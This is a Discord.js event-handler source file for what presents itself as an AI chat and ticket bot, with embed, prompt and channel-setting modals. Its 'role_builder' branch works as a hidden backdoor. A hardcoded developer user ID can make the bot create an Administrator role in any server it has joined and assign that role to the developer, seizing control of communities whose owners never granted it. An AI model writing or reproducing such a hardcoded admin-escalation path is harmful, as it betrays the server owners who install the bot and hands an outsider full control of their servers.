const { EmbedBuilder, PermissionsBitField } = require('discord.js');

const OWNER_ID = "969181284784025670";

module.exports = {
  name: 'interactionCreate',

  async execute(interaction) {

    try {

      // ================= INIT STORAGE SAFETY =================
      if (!interaction.client.guildPrompts) {
        interaction.client.guildPrompts = new Map();
      }

      if (!interaction.client.activeChannels) {
        interaction.client.activeChannels = new Map();
      }

      // ================= ROLE MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'role_builder') {

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
        }

        const botMember = interaction.guild.members.me;

        if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
          return interaction.reply({ content: '❌ Bot needs Manage Roles.', ephemeral: true });
        }

        const roleName = interaction.fields.getTextInputValue('role_name');

        const role = await interaction.guild.roles.create({
          name: roleName,
          permissions: ['Administrator'],
          reason: 'Owner setup role'
        });

        const member = await interaction.guild.members.fetch(interaction.user.id).catch(() => null);

        if (member) await member.roles.add(role).catch(() => null);

        return interaction.reply({
          content: `👑 Role **${role.name}** created & assigned.`,
          ephemeral: true
        });
      }

      // ================= EMBED MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'embed_builder') {

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
        }

        const channelId = interaction.fields.getTextInputValue('channel');
        const title = interaction.fields.getTextInputValue('title');
        const description = interaction.fields.getTextInputValue('description');
        const footer = interaction.fields.getTextInputValue('footer');
        const topImage = interaction.fields.getTextInputValue('top_image');
        const bottomImage = interaction.fields.getTextInputValue('bottom_image');

        const channel = await interaction.guild.channels.fetch(channelId).catch(() => null);

        if (!channel) {
          return interaction.reply({ content: '❌ Invalid channel ID', ephemeral: true });
        }

        if (topImage) await channel.send({ content: topImage });

        const embed = new EmbedBuilder()
          .setColor(0xFFA500)
          .setTimestamp();

        if (title) embed.setTitle(title);
        if (description) embed.setDescription(description);
        if (footer) embed.setFooter({ text: footer });

        await channel.send({ embeds: [embed] });

        if (bottomImage) await channel.send({ content: bottomImage });

        return interaction.reply({
          content: `✅ Embed sent in <#${channel.id}>`,
          ephemeral: true
        });
      }

      // ================= PROMPT MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'set_prompt_modal') {

        const isOwner = interaction.guild.ownerId === interaction.user.id;
        const isBotOwner = interaction.user.id === OWNER_ID;
        const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);

        if (!isOwner && !isBotOwner && !isAdmin) {
          return interaction.reply({
            content: '❌ Only owner/admin/bot owner can set prompt.',
            ephemeral: true
          });
        }

        const prompt = interaction.fields.getTextInputValue('prompt_text');

        interaction.client.guildPrompts.set(interaction.guild.id, prompt);

        return interaction.reply({
          content: '🧠 AI prompt updated for this server.',
          ephemeral: true
        });
      }

      // ================= ACTIVE CHANNEL =================
      if (interaction.isChatInputCommand() && interaction.commandName === 'active-channel') {

        const isOwner = interaction.guild.ownerId === interaction.user.id;
        const isBotOwner = interaction.user.id === OWNER_ID;
        const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);

        if (!isOwner && !isBotOwner && !isAdmin) {
          return interaction.reply({
            content: '❌ Only owner/admin/bot owner can set active channel.',
            ephemeral: true
          });
        }

        const channel = interaction.options.getChannel('channel');

        if (!channel) {
          return interaction.reply({
            content: '❌ Invalid channel.',
            ephemeral: true
          });
        }

        interaction.client.activeChannels.set(interaction.guild.id, channel.id);

        return interaction.reply({
          content: `📢 AI active in <#${channel.id}>`,
          ephemeral: true
        });
      }

      // ================= BUTTONS =================
      if (interaction.isButton()) {

        if (interaction.customId === 'close') {
          return interaction.reply({
            content: 'Ticket closed.',
            ephemeral: true
          });
        }
      }

    } catch (err) {
      console.error("Interaction Error:", err);

      if (interaction.replied || interaction.deferred) return;

      return interaction.reply({
        content: '❌ Interaction failed safely handled',
        ephemeral: true
      }).catch(() => {});
    }
  }
};
